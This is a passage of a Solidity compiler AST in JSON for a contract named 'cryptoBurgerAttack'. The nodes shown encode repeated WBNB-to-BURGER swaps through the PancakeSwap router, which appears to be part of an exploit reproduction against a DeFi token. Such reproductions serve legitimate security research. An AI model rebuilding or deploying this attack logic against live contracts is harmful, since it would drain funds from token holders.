                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "7370:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 695,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "7362:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 694,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "7362:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 697,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "7362:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 693,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "7354:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 692,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "7354:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 698,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "7354:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 685,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "7313:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 699,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7313:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 700,
                  "nodeType": "ExpressionStatement",
                  "src": "7313:64:0"
                },
                {
                  "expression": {
                    "id": 709,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 701,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "7387:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 706,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "7466:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 707,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "7495:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 703,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "7419:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 702,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "7402:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 704,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "7402:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 705,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "7402:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 708,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "7402:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "7387:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 710,
                  "nodeType": "ExpressionStatement",
                  "src": "7387:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 712,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "7526:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 713,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "7532:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 714,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "7540:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 716,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 715,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7553:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "7540:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 717,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "7557:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 722,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "7576:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 721,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "7568:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 720,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "7568:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 723,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "7568:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 719,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "7560:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 718,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "7560:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 724,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "7560:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 711,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "7519:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 725,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7519:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 726,
                  "nodeType": "ExpressionStatement",
                  "src": "7519:64:0"
                },
                {
                  "expression": {
                    "id": 735,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 727,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "7593:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 732,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "7672:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 733,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "7701:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 729,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "7625:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 728,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "7608:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 730,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "7608:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 731,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "7608:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 734,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "7608:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "7593:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 736,
                  "nodeType": "ExpressionStatement",
                  "src": "7593:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 738,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "7732:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 739,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "7738:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 740,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "7746:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 742,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 741,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7759:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "7746:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 743,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "7763:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 748,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "7782:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 747,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "7774:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 746,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "7774:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 749,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "7774:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 745,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "7766:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 744,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "7766:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 750,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "7766:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 737,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "7725:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 751,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7725:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 752,
                  "nodeType": "ExpressionStatement",
                  "src": "7725:64:0"
                },
                {
                  "expression": {
                    "id": 761,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 753,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "7799:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 758,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "7878:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 759,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "7907:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 755,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "7831:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 754,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "7814:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 756,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "7814:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 757,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "7814:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 760,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "7814:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "7799:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 762,
                  "nodeType": "ExpressionStatement",
                  "src": "7799:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 764,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "7938:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 765,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "7944:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 766,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "7952:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 768,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 767,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7965:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "7952:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 769,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "7969:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 774,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "7988:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 773,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "7980:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 772,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "7980:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 775,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "7980:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 771,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "7972:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 770,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "7972:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 776,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
